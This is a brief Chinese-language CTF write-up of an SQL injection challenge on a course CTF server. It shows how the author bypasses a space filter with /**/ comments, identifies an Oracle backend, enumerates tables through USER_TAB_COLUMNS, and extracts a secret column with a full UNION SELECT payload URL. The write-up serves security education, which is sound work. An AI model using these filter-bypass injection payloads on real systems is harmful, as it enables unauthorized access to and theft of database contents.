發現他有擋 空白 和 `;`，嘗試用 `/**/` 繞過空白。
首先利用 `/**/ORDER/**/BY/**/3` 發現他有 3 個 column，但利用 `/**/UNION/**/SELECT/**/NULL,NULL,NULL` 會產生錯誤。
跑去找 kaibro 的 WEB CTF CheatSheet 發現 Oracle 的 SELECT 語句必須包含 FROM，可用dual，最後發現是用 Oracle sql。

由於 Oracle 可以用 `||` 去連接字串，因此可以透過
`(-1)/**/UNION/**/SELECT/**/NULL,TABLE_NAME||1||COLUMN_NAME,NULL/**/FROM/**/USER_TAB_COLUMNS`
去取得 table 和 column 名字。

由於 Oracle 沒有 `limit` 語法，因此我透過 `ROWNUM` 和 `MINUS` 取代，並去寫一個 python 腳本去爆開

最後有發現幾個有趣的名字
```
22
S3CRET ID
23
S3CRET V3RY_S3CRET_C0LUMN
```
最後去解開
`https://edu-ctf.csie.org:10159/video.php?vid=(-1)/**/UNION/**/SELECT/**/NULL,V3RY_S3CRET_C0LUMN,NULL/**/FROM/**/S3CRET`
注意 ： 由於 css 會把字母全部變大寫，直接開 f12

